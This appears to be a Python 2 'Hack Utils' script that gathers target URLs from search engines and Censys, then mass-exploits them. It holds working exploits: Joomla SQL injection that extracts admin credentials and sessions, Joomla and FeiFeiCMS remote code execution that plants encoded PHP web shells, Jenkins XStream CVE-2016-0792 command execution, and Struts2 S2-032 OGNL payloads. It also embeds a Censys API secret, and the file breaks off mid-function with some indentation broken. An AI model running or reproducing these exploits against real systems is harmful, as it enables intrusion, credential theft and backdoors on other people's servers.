#!/usr/bin/env python

#*******************************#
# Description: Hack Utils       #
#*******************************#

import urllib2
import urllib
import json
import re
import sys
import os
import time
import ssl
import getopt
import hashlib
import base64
import ConfigParser
import cookielib
import requests
import socket
import commands
import random

timeout = 10
socket.setdefaulttimeout(timeout)

from bs4 import BeautifulSoup
from Crypto.Cipher import AES
from Crypto import Random

# Ignore SSL error when accessing a HTTPS website
# ssl._create_default_https_context = ssl._create_unverified_context

reload(sys)
sys.setdefaultencoding( "gb2312" )

def logfile(log,logfile):
    f=open(logfile,'a')
    f.write(log+"\n")
    f.close

def isExisted(mystr,filepath):
    if os.path.exists(filepath):
        mystr=mystr.strip()
        f=open(filepath,'r')
        num=0
        for eachline in f:
            if mystr in eachline:
                num=num+1
            else:
                num=num
        if num >0:
            return True
        else:
            return False
    else:
        return False

def getUrlRespHtml(url):
    respHtml=''
    try:
        heads = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Charset':'GB2312,utf-8;q=0.7,*;q=0.7',
                'Accept-Language':'zh-cn,zh;q=0.5',
                'Cache-Control':'max-age=0',
                'Connection':'keep-alive',
                'Keep-Alive':'115',
                'User-Agent':'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.10 (maverick) Firefox/3.6.14'}

        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
        urllib2.install_opener(opener)
        req = urllib2.Request(url)
        opener.addheaders = heads.items()
        respHtml = opener.open(req).read()
    except Exception:
        pass
    return respHtml

def getUrlRespHtmlByProxy(url,proxy):
    respHtml=''
    try:
        heads = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Charset':'GB2312,utf-8;q=0.7,*;q=0.7',
                'Accept-Language':'zh-cn,zh;q=0.5',
                'Cache-Control':'max-age=0',
                'Connection':'keep-alive',
                'Keep-Alive':'115',
                'User-Agent':'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.10 (maverick) Firefox/3.6.14'}
        opener = urllib2.build_opener(urllib2.ProxyHandler({'https':proxy}))
        urllib2.install_opener(opener)
        req = urllib2.Request(url)
        opener.addheaders = heads.items()
        respHtml = opener.open(req).read()
    except Exception:
        pass
    return respHtml

def getLinksFromBaidu(html):
    soup = BeautifulSoup(html)
    html=soup.find('div', id="results")
    if not html:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [WARNING] failed to crawl"
    else:
        html_doc=html.find_all('div', class_="c-showurl")
        if not html_doc:
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [WARNING] failed to crawl"
        else:
            for doc in html_doc:
                try:
                    href=doc.find_all('span')[0].find_all(text=True)[0]
                    rurl="http://"+str(href)+"/"
                    if not isExisted(rurl,'urls.txt'):
                        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                        logfile(rurl,'urls.txt')
                        print "["+str(now)+"] [INFO] "+rurl
                    else:
                        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                        print "["+str(now)+"] [WARNING] url is duplicate ["+rurl+"]"
                except Exception:
                    pass

def getUrlsFromBaidu(html):
    soup = BeautifulSoup(html)
    html=soup.find('div', id="results")
    if not html:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [WARNING] failed to crawl"
    else:
        html_doc=html.find_all('div', class_="c-container")
        if not html_doc:
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [WARNING] failed to crawl"
        else:
            for doc in html_doc:
                try:
                    href=doc.find_all('a')[0].get('href')
                    href="http://wap.baidu.com"+str(href).strip()
                    res=urllib.unquote(urllib2.urlopen(href).read())
                    reg='.*<meta http-equiv="refresh" content="0; url=(.*?)" \/>.*'
                    match_url = re.search(reg,res)
                    if match_url:
                        rurl=match_url.group(1)
                        if not isExisted(rurl,'urls.txt'):
                            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                            logfile(rurl,'urls.txt')
                            print "["+str(now)+"] [INFO] "+rurl
                        else:
                            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                            print "["+str(now)+"] [WARNING] url is duplicate ["+rurl+"]"
                except Exception:
                    pass

def getLinksFromGoogle(html,wd):
    if not html:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [WARNING] failed to crawl"
    else:
        html_doc=json.loads(html)
        status = html_doc["responseStatus"]
        if str(status) == '200':
            info = html_doc["responseData"]["results"]
            for item in info:
                for key in item.keys():
                    if key == 'url':
                        link=item[key]
                        rurl=urllib.unquote(link.strip())
                        kd=''
                        if "inurl:" in wd:
                            kd=wd.strip().split("inurl:")[1]
                        elif "site:" in wd:
                            kd=wd.strip().split("site:")[1]
                        else:
                            kd=wd.strip()
                        if kd in rurl:
                            if not isExisted(rurl,'urls.txt'):
                                now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                                logfile(rurl,'urls.txt')
                                print "["+str(now)+"] [INFO] "+rurl
                            else:
                                now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                                print "["+str(now)+"] [WARNING] url is duplicate ["+rurl+"]"
        else:
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [WARNING] failed to crawl"

def getDomainsFromBaidu(html):
    soup = BeautifulSoup(html)
    html=soup.find('div', id="results")
    if not html:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [WARNING] failed to crawl"
    else:
        html_doc=html.find_all('div', class_="c-showurl")
        if not html_doc:
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [WARNING] failed to crawl"
        else:
            for doc in html_doc:
                try:
                    href=doc.find_all('span')[0].find_all(text=True)[0]
                    site="http://"+str(href)+"/"
                    if not isExisted(site,'subdomains.txt'):
                        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                        logfile(site,'subdomains.txt')
                        print "["+str(now)+"] [INFO] "+site
                    else:
                        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                        print "["+str(now)+"] [WARNING] url is duplicate ["+site+"]"
                except Exception:
                    pass

def getLinksFromWooyun(html):
    soup = BeautifulSoup(html)
    soup = soup.find('div', class_="content")
    soup = soup.find('table',class_="listTable")
    html = soup.find('tbody')
    if not html:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [WARNING] failed to crawl"
    else:
        html_doc=html.find_all('tr')
        if not html_doc:
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [WARNING] failed to crawl"
        else:
            for doc in html_doc:
                try:
                    td=doc.find_all('td')[2]
                    atag=td.find('a')
                    link=atag.get('href').strip()
                    if not isExisted(link,'wooyun.txt'):
                        logfile(link,'wooyun.txt')
                        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                        print "["+str(now)+"] [INFO] "+link
                    else:
                        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
                        print "["+str(now)+"] [WARNING] url is duplicate ["+link+"]"
                except Exception:
                    pass

def fetchUrls(se,wd,pg):
    if 'baidu' in se:
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [INFO] Fetching URLs from Baidu..."
        wd=urllib.quote(wd.strip())
        for x in xrange(1,pg):
            rn=10
            pn=(x-1)*rn
            url='http://wap.baidu.com/s?pn='+str(pn)+'&word='+wd
            html=getUrlRespHtml(url)
            urls=getLinksFromBaidu(html)
    elif 'google' in se:
        proxy=''
        user=''
        passwd=''
        proxyserver=''
        proxyini = os.path.dirname(os.path.realpath(__file__))+"/proxy.ini"
        config=ConfigParser.ConfigParser()
        config.read("proxy.ini")
        if not os.path.exists(proxyini):
            print "[INFO] Please configure a proxy to access to Google..."
            proxyserver=raw_input('[+] Enter proxy server (e.g. 192.95.4.120:8888): ')
            user=raw_input('[+] Enter user name [press Enter if anonymous]: ')
            passwd=raw_input('[+] Enter password [press Enter if anonymous]: ')
            config.add_section("Proxy")
            config.set("Proxy","user",user)
            config.set("Proxy","passwd",passwd)
            config.set("Proxy","proxyserver",proxyserver)
            config.write(open("proxy.ini", "w"))
        else:
            user=config.get("Proxy","user")
            passwd=config.get("Proxy","passwd")
            proxyserver=config.get("Proxy","proxyserver")
        now = time.strftime('%H:%M:%S',time.localtime(time.time()))
        print "["+str(now)+"] [INFO] Fetching URLs from Google..."
        for x in xrange(0,pg):
            url='https://ajax.googleapis.com/ajax/services/search/web?v=1.0&q='+wd.strip()+'&rsz=8&start='+str(x)
            if not proxyserver:
                html=getUrlRespHtml(url)
            elif not user or not passwd:
                proxy = "http://"+proxyserver.strip()
                html=getUrlRespHtmlByProxy(url,proxy)
            else:
                proxy = 'http://%s:%s@%s' % (user.strip(), passwd.strip(), proxyserver.strip())
                html=getUrlRespHtmlByProxy(url,proxy)
            urls=getLinksFromGoogle(html,wd)
    elif 'wooyun' in se:
        wooyun = os.path.dirname(os.path.realpath(__file__))+"/wooyun.txt"
        if not os.path.exists(wooyun):
            now = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(now)+"] [INFO] Fetching sites from Wooyun Corps..."
            for i in xrange(1,43):
                url='http://www.wooyun.org/corps/page/'+str(i)
                html=getUrlRespHtml(url)
                getLinksFromWooyun(html)
            print "\n[INFO] Fetched Sites from Wooyun:"
            print "[*] Output File: "+wooyun
        links = open('wooyun.txt','r')
        for link in links:
            site = link.split("//")[1]
            if "www." in site:
                site=site.split("www.")[1]
            kwd=wd.strip()+" "+"site:"+site.strip()
            kwd=urllib.quote(kwd)
            print "\n[INFO] Scanned Site: "+site.strip()
            for x in xrange(1,pg):
                rn=10
                pn=(x-1)*rn
                url='http://wap.baidu.com/s?pn='+str(pn)+'&word='+kwd
                html=getUrlRespHtml(url)
                urls=getUrlsFromBaidu(html)
        links.close()
    output = os.path.dirname(os.path.realpath(__file__))+"/urls.txt"
    if os.path.exists(output):
        print "\n[INFO] Fetched URLs:"
        print "[*] Output File: "+output

def scanSubDomains(se,wd,pg):
    if 'baidu' in se:
        if "www." in wd:
            wd=wd.split("www.")[1]
        print "[INFO] Scanned Site: "+wd.strip()
        kwd="site:"+wd.strip()
        kwd=urllib.quote(kwd)
        for x in xrange(1,pg):
            rn=10
            pn=(x-1)*rn
            url='http://wap.baidu.com/s?pn='+str(pn)+'&word='+kwd
            html=getUrlRespHtml(url)
            urls=getDomainsFromBaidu(html)
    output = os.path.dirname(os.path.realpath(__file__))+"/subdomains.txt"
    if os.path.exists(output):
        print "\n[INFO] Scanned SubDomains:"
        print "[*] Output File: "+output

def encryptStr(value):
    value=value.strip()
    md5=hashlib.md5(value).hexdigest()
    sha1=hashlib.sha1(value).hexdigest()
    sha256=hashlib.sha256(value).hexdigest()
    b64=base64.b64encode(value)
    print "[INFO] Clear Text: "+value
    print "[*] MD5: "+md5
    print "[*] SHA1: "+sha1
    print "[*] SHA256: "+sha256
    print "[*] Base64: "+b64

def checkJoomla(value):
    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
    print "["+str(now)+"] [INFO] Checking Joomla 3.2.0 - 3.4.4 history.php SQLi..."
    if 'http://' in value or 'https://' in value:
        url=value
        checkJoomlaSQLi(url)
    else:
        urlfile=open(value,'r')
        for url in urlfile:
            if url.strip():
                checkJoomlaSQLi(url)
        urlfile.close()
    output = os.path.dirname(os.path.realpath(__file__))+"/joomla_vuls.txt"
    if os.path.exists(output):
        print "\n[INFO] Scanned Vuls:"
        print "[*] Output File: "+output

def checkJoomlaSQLi(url):
    url = url.strip()
    poc = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select 0x6176666973686572),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    urlA=url+poc
    try:
        result = requests.get(urlA,timeout=10,allow_redirects=True,verify=False).content
        if 'avfisher' in result:
            username = getInfoByJoomlaSQLi(url, 'username')
            password = getInfoByJoomlaSQLi(url, 'password')
            email = getInfoByJoomlaSQLi(url, 'email')
            session_id = getInfoByJoomlaSQLi(url, 'session_id')
            vuls='[+] vuls found! url: '+url+', admin: '+username+', password: '+password+', email: '+email+', session_id: '+session_id
            logfile(vuls,'joomla_vuls.txt')
            print vuls
        else:
            print '[!] no vuls! url: '+url
    except Exception,e:
        print '[!] connection failed! url: '+url

def getInfoByJoomlaSQLi(url, param):
    if 'username' in param:
        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(username)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    elif 'password' in param:
        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(password)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    elif 'email' in param:
        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(email)) from %23__users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    elif 'session_id' in param:
        payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(session_id)) FROM %23__session WHERE data LIKE '%Super User%' AND data NOT LIKE '%IS NOT NULL%' AND userid!='0' AND username IS NOT NULL LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    urlA=url+payload
    try:
        result = requests.get(urlA,timeout=10,allow_redirects=True,verify=False).content
        if "Duplicate entry '" in result:
            reg = ".*Duplicate entry \'(.*?)1\'.*"
        elif "Duplicate entry &#039" in result:
            reg = ".*Duplicate entry \&\#039;(.*?)1\&\#039;.*"
        match_url = re.search(reg,result)
        if match_url:
            info=match_url.group(1)
        return info
    except Exception,e:
        return 'no info!'

def rceJoomla(value):
    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
    print "["+str(now)+"] [INFO] Checking Joomla 1.5 - 3.4.5 Remote Code Execution..."
    if 'http://' in value or 'https://' in value:
        url=value
        checkJoomlaRCE(url)
    else:
        urlfile=open(value,'r')
        for url in urlfile:
            if url.strip():
                checkJoomlaRCE(url)
        urlfile.close()
    output = os.path.dirname(os.path.realpath(__file__))+"/joomla_rce.txt"
    if os.path.exists(output):
        print "\n[INFO] Scanned Vuls:"
        print "[*] Output File: "+output

def checkJoomlaRCE(url):
    url = url.strip()
    reg = 'http[s]*://.*/$'
    m = re.match(reg,url)
    if not m:
        url = url + "/"
    poc = generate_payload("phpinfo();")
    try:
        result = get_url(url, poc)
        if 'phpinfo()' in result:
            system = getInfoByJoomlaRCE(result, 'System')
            document_root = getInfoByJoomlaRCE(result, 'DOCUMENT_ROOT')
            script_filename = getInfoByJoomlaRCE(result, 'SCRIPT_FILENAME')
            shell_file = getShellByJoomlaRCE(url, system, script_filename)
            vuls='[+] vuls found! url: '+url+', System: '+system+', document_root: '+document_root+', script_filename: '+script_filename+', shell_file: '+shell_file
            logfile(vuls,'joomla_rce.txt')
            print vuls
        else:
            print '[!] no vuls! url: '+url
    except Exception,e:
        print '[!] connection failed! url: '+url

def get_url(url, user_agent):
    headers = {
            'User-Agent': user_agent
            }
    cookies = requests.get(url,headers=headers).cookies
    for _ in range(3):
        response = requests.get(url, timeout=10, headers=headers, cookies=cookies)
    return response.content

def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
    return encoded[:-1]

def generate_payload(php_payload):
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))

    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

    return exploit_template

def getInfoByJoomlaRCE(result, param):
    if "System" in param:
        reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "DOCUMENT_ROOT" in param:
        reg = '.*<tr><td class="e">_SERVER\["DOCUMENT_ROOT"\]</td><td class="v">([^<>]*?)</td></tr>.*'
    elif "SCRIPT_FILENAME" in param:
        reg = '.*<tr><td class="e">_SERVER\["SCRIPT_FILENAME"\]</td><td class="v">([^<>]*?)</td></tr>.*'
    match_url = re.search(reg,result)
    if match_url:
        info=match_url.group(1)
    else:
        info = 'no info!'
    return info

def getShellByJoomlaRCE(url, system, script_filename):
    if 'no info' not in script_filename and 'no info' not in system:
        if 'Windows' in system:
            shell = script_filename.split('index.php')[0].replace('/','//').strip()+"images//1ndex.php"
        else:
            shell = script_filename.split('index.php')[0]+"images/1ndex.php"
        #yijuhua = "<?php eval($_POST[1]);?>"
        cmd ="file_put_contents('"+shell+"',base64_decode('PD9waHAgaWYoISRfUE9TVFsnaGFuZGxlJ10pe2hlYWRlcignSFRUUC8xLjEgNDA0IE5vdCBGb3VuZCcpOyBleGl0KCk7IH1lbHNleyAkcz0icCIuInIiLiJlIi4iZyIuIl8iLiJyIi4iZSIuInAiLiJsIi4iYSIuImMiLiJlIjsgJHMoIn5bZGlzY3V6XX5lIiwkX1BPU1RbJ2hhbmRsZSddLCJBY2Nlc3MiKTsgfSA/Pg=='));"
        pl = generate_payload(cmd)
        try:
            get_url(url, pl)
            return url+"images/1ndex.php"
        except Exception, e:
            return "no info!"
    else:
        return "no info!"

def rceFeiFeiCMS(value):
    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
    print "["+str(now)+"] [INFO] Checking FeiFeiCMS 2.8 Remote Code Execution..."
    if 'http://' in value or 'https://' in value:
        url=value
        checkFeiFeiCMS(url)
    else:
        urlfile=open(value,'r')
        for url in urlfile:
            if url.strip():
                checkFeiFeiCMS(url)
        urlfile.close()
    output = os.path.dirname(os.path.realpath(__file__))+"/feifeicms_rce.txt"
    if os.path.exists(output):
        print "\n[INFO] Scanned Vuls:"
        print "[*] Output File: "+output

def checkFeiFeiCMS(url):
    url = url.strip()
    reg = 'http[s]*://.*/$'
    m = re.match(reg,url)
    if not m:
        url = url + "/"
    logfilename=str(time.strftime('%y_%m_%d',time.localtime(time.time())))+".log.html"
    poc_1 = url+"index.php?s=my-show-id-1{~phpinfo()}.html"
    poc_2 = url+"index.php?s=my-show-id-\\..\\Runtime\\Logs\\"+logfilename
    try:
        result = exploitFeiFeiCMS(poc_1,poc_2)
        if 'phpinfo()' in result:
            system = getInfoByFeiFeiCMS(result, 'System')
            document_root = getInfoByFeiFeiCMS(result, 'DOCUMENT_ROOT')
            script_filename = getInfoByFeiFeiCMS(result, 'SCRIPT_FILENAME')
            shell_file = getShellByFeiFeiCMS(url)
            vuls='[+] vuls found! url: '+url+', System: '+system+', document_root: '+document_root+', script_filename: '+script_filename+', shell_file: '+shell_file
            logfile(vuls,'feifeicms_rce.txt')
            print vuls
        else:
            print '[!] no vuls! url: '+url
    except Exception,e:
        print '[!] connection failed! url: '+url

def exploitFeiFeiCMS(p1, p2):
    requests.get(p1, timeout=10)
    response = requests.get(p2, timeout=10)
    return response.content

def getInfoByFeiFeiCMS(result, param):
    if "System" in param:
        reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
    elif "DOCUMENT_ROOT" in param:
        reg = '.*<tr><td class="e">_SERVER\["DOCUMENT_ROOT"\]</td><td class="v">([^<>]*?)</td></tr>.*'
    elif "SCRIPT_FILENAME" in param:
        reg = '.*<tr><td class="e">_SERVER\["SCRIPT_FILENAME"\]</td><td class="v">([^<>]*?)</td></tr>.*'
    match_url = re.search(reg,result)
    if match_url:
        info=match_url.group(1)
    else:
        info = 'no info!'
    return info

def getShellByFeiFeiCMS(url):
    logfilename=str(time.strftime('%y_%m_%d',time.localtime(time.time())))+".log.html"
    #cmd ="file_put_contents('1ndex.php',base64_decode(base64_decode('UEQ5d2FIQWdhV1lvSVNSZlVFOVRWRnNuYUdGdVpHeGxKMTBwZTJobFlXUmxjaWduU0ZSVVVDOHhMakVnTkRBMElFNXZkQ0JHYjNWdVpDY3BPeUJsZUdsMEtDazdJSDFsYkhObGV5QWtjejBpY0NJdUluSWlMaUpsSWk0aVp5SXVJbDhpTGlKeUlpNGlaU0l1SW5BaUxpSnNJaTRpWVNJdUltTWlMaUpsSWpzZ0pITW9JbjViWkdselkzVjZYWDVsSWl3a1gxQlBVMVJiSjJoaGJtUnNaU2RkTENKQlkyTmxjM01pS1RzZ2ZTQS9QZz09')))"  #password: handle
    #cmd = "file_put_contents('wooyun.txt','wooyun')"
    shell = 'h.php'
    cmd ="file_put_contents('"+shell+"',base64_decode(base64_decode('UEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VV3ljeEoxMHBPejgr')))" #password: 1
    payload_l = url+"index.php?s=my-show-id-1{~"+str(cmd)+"}.html"
    payload_2 = url+"index.php?s=my-show-id-\\..\\Runtime\\Logs\\"+logfilename
    try:
        exploitFeiFeiCMS(payload_l, payload_2)
        return url+shell
    except Exception, e:
        return "no info!"

def fetchCensys(value,field,page):
    API_URL = "https://www.censys.io/api/v1"
    UID = "3ac350c3-21f9-46be-aeb7-d18f832006f9"  #Your API UID
    SECRET = "UBqUKkuUevh2pZqfO3fQalqNVDheGWuc"   #Your API SECRET
    value = value.strip()
    field = field.strip()
    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
    print "["+str(now)+"] [INFO] Fetching IPs/URLs from Censys..."
    for i in range(1,page):
        data = {
                "query":value,
                "page":int(i),
                "fields":[field]
                }
        if field == "ip":
            res = requests.post(API_URL + "/search/ipv4", data=json.dumps(data), auth=(UID, SECRET)).text
        elif field == "domain":
            res = requests.post(API_URL + "/search/websites", data=json.dumps(data), auth=(UID, SECRET)).text
        try:
            results = json.loads(res)
            for result in results["results"]:
                censys=result[field]
                mynow = time.strftime('%H:%M:%S',time.localtime(time.time()))
                if field == "domain":
                    censys = "http://"+censys
                logfile(censys,'censys.txt')
                print "["+str(mynow)+"] [INFO] "+censys
        except Exception:
            mynow = time.strftime('%H:%M:%S',time.localtime(time.time()))
            print "["+str(mynow)+"] [WARNING] nothing found, please check API UID and SECRET!"
    output = os.path.dirname(os.path.realpath(__file__))+"/censys.txt"
    if os.path.exists(output):
        print "\n[INFO] Fetched IPs/URLs:"
        print "[*] Output File: "+output

def rceXStreamJenkins(value):
    value_ip = value.strip().split("::")[0]
    if len(value.strip().split("::"))>1:
        value_cmdstr = value.strip().split("::")[1]
    else:
        value_cmdstr = ""
    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
    print "["+str(now)+"] [INFO] Checking XStream (Jenkins CVE-2016-0792) Remote Code Execution..."
    if os.path.exists(value_ip.strip()):
        ipfile=open(value_ip,'r')
        for ip in ipfile:
            if ip.strip():
                checkXStreamJenkins(ip, value_cmdstr)
        ipfile.close()
    else:
        checkXStreamJenkins(value_ip, value_cmdstr)
    output = os.path.dirname(os.path.realpath(__file__))+"/jenkins.txt"
    if os.path.exists(output):
        print "\n[INFO] Scanned Vuls:"
        print "[*] Output File: "+output

def checkXStreamJenkins(ip, cmdstr):
    ip = ip.strip()
    url = getURLFromJenkins(ip)
    if url:
        try:
            result = requests.get(url,timeout=10).content
            #job = getJobFromJenkins(result)
            ver = getJenkinsVersion(result)
            #if job:
                #job_url = url + job + "config.xml"
            job_url = url + "createItem?name=hackUtils"
            exploitXStreamJenkins(job_url, cmdstr, ver)
            #else:
            #    print '[!] no job found! url: '+url
        except Exception,e:
            print '[!] connection failed! url: '+url
    else:
        print '[!] connection failed! ip: '+ip

def exploitXStreamJenkins(job_url, cmdstr, ver):
    command = ""
    if cmdstr == "":
        command = "<string>dir</string>"
    else:
        cmd = cmdstr.split(" ")
        for str in cmd:
            command += "<string>" + str + "</string>"
    payload = "<map><entry><groovy.util.Expando><expandoProperties><entry><string>hashCode</string><org.codehaus.groovy.runtime.MethodClosure><delegate class=\"groovy.util.Expando\" reference=\"../../../..\"/><owner class=\"java.lang.ProcessBuilder\"><command>"+command+"</command><redirectErrorStream>false</redirectErrorStream></owner><resolveStrategy>0</resolveStrategy><directive>0</directive><parameterTypes/><maximumNumberOfParameters>0</maximumNumberOfParameters><method>start</method></org.codehaus.groovy.runtime.MethodClosure></entry></expandoProperties></groovy.util.Expando><int>1</int></entry></map>"

    try:
        headers = {'content-type': 'application/xml'}
        res = requests.post(job_url,timeout=10,data=payload,headers=headers)
        if res.status_code == 500:
            html = res.content
            if html:
                reg = '.*java.io.IOException: Unable to read([^<>]*?)at hudson\.XmlFile\.*'
                match = re.search(reg,html)
                if match:
                    job_path=match.group(1).strip()
                   if ":" in job_path:
                       system = "Windows"
                   else:
                       system = "Linux/Unix"
                   vul= "[+] vuls found! url: "+job_url+", system: "+system+", version: "+ver+", job_path: "+job_path
                   logfile(vul,'jenkins.txt')
                   print vul
               else:
                   print '[!] exploit failed! job_url: '+job_url
            else:
                print '[!] exploit failed! job_url: '+job_url
        else:
            print '[!] exploit failed! job_url: '+job_url
    except Exception:
        print '[!] exploit failed! job_url: '+job_url

def getURLFromJenkins(ip):
    url1 = "http://"+ip+"/jenkins/"
    url2 = "http://"+ip+":8080/jenkins/"
    url3 = "http://"+ip+":8080/"
    url4 = "http://"+ip+"/"
    if returnCodeFromURL(url1) == 200:
        return url1
    elif returnCodeFromURL(url2) == 200:
        return url2
    elif returnCodeFromURL(url3) == 200:
        return url3
    elif returnCodeFromURL(url4) == 200:
        return url4
    else:
        return ""

def returnCodeFromURL(url):
    try:
        res = requests.get(url,timeout=10).status_code
        return res
    except Exception:
        return ""

def getJobFromJenkins(html):
    try:
        soup = BeautifulSoup(html)
        html=soup.find('div', class_="dashboard")
        html_doc=html.find('table', id="projectstatus")
        href=html_doc.find_all('a', class_="model-link inside")[0].get('href')
        if href:
            return href
        else:
            return ""
    except Exception:
        return ""

def getJenkinsVersion(html):
    try:
        soup = BeautifulSoup(html)
        html_doc=soup.find('span', class_="jenkins_ver")
        ver=html_doc.find('a').find_all(text=True)[0]
        if ver:
            return str(ver)
        else:
            return ""
    except Exception:
        return ""

def rceStruts2S2032(value):
    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
    print "["+str(now)+"] [INFO] Checking Struts2 (S2-032) Remote Code Execution..."
    if 'http://' in value or 'https://' in value:
        url=value
        checkS2032(url)
    else:
        urlfile=open(value,'r')
        for url in urlfile:
            if url.strip():
                checkS2032(url)
        urlfile.close()
    output = os.path.dirname(os.path.realpath(__file__))+"/s2032_rce.txt"
    if os.path.exists(output):
        print "\n[INFO] Scanned Vuls:"
        print "[*] Output File: "+output

def checkS2032(url):
    url = url.strip()
    if '?' in url:
        url = url.split('?')[0]

    poc = url+"?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command[0]%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char[51020]%2c%23c.read%28%23d%29%2c%23kxlzx%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%29%2c%23kxlzx.close&command=netstat"
    poc_root_path = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8"
    poc_whoami = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=A&ppp=%20&encoding=UTF-8"

    shellname="nimabi.jsp"
    shellpwd="nmb"
    #shellcontent_win="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%2f%22%29%2brequest.getParameter%28%22"+shellpwd+"%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
    #shellcontent_linux="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%5C%5C%22%29%2brequest.getParameter%28%22"+shellpwd+"%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
